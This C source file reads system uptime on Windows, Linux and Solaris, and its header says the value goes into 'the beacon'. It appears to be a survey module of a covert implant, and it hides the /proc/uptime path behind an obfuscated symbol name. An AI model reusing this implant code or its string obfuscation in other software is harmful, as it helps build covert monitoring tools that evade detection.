/*!
	\file	SurveyUptime.c
	\brief	Functions to pull uptime from local system to be passed in the beacon
*/

#include "compat.h"
#include "debug.h"
#include "survey_uptime.h"


//*************************************************************
#ifdef WIN32

//TODO: Check over calculations of time string
unsigned long GetSystemUpTime( void )
{
	//get the system uptime in milliseconds
	return GetTickCount()/1000;
}

#elif defined LINUX

//extern unsigned char proc_uptime[];
extern unsigned char uPasg18a[];

unsigned long GetSystemUpTime( void )
{
	FILE			*fp;
	unsigned int	tm = 0;
	int				rv;

	//fp = fopen( (char *)proc_uptime, "r" );
	fp = fopen( (char *)uPasg18a, "r" );

	if ( fp == NULL )
	{
		// if fails, will return zero uptime
		D( printf( " ERROR: could not read /proc/uptime\n" ); )
    	return 0;
	}
	
	// fopen success
	rv = fscanf( fp, "%i", &tm);

	if ( rv == EOF )
	{
		D( perror( " fscanf()" ); )
		return 0;
	}

#ifdef	DEBUG
	printf( " DEBUG: uptime: %i seconds\n", (int)tm );
//	printf( " DEBUG: from system(): " );
//	rv = system( "cat /proc/uptime" );
#endif

	fclose( fp );
	
	//	convert uptime to minutes   
	//tm = tm/60;

	return (unsigned long)tm;
}

#elif defined SOLARIS

#include <utmpx.h>
#include <time.h>

unsigned long GetSystemUpTime( void )
{
	unsigned int	tm = 0;
	static int		boottime;
	int				currtime = time( NULL );
	struct utmpx	*entry;

	if ( boottime == 0 ) {
	while ( ( entry = getutxent() ) )
	{
		if ( !strcmp( "system boot", entry->ut_line ) )
		{
			boottime = entry->ut_tv.tv_sec;
		}
	} }

	D( printf( " DEBUG: boottime = %d\n", boottime ); )
	D( printf( " DEBUG: currtime = %d\n", currtime ); )

	// tm here will be uptime in seconds
	tm = currtime - boottime;	

	if ( tm == 0 )
	{
		// could not read Solaris user accounting database
		D( printf( " ERROR: Could not pull uptime from Solaris user accounting database\n" ); )
		return 0;
	}
	
	D( printf( " DEBUG: uptime: %i seconds\n", (int)tm ); )

	return (unsigned long)tm;
}

#endif
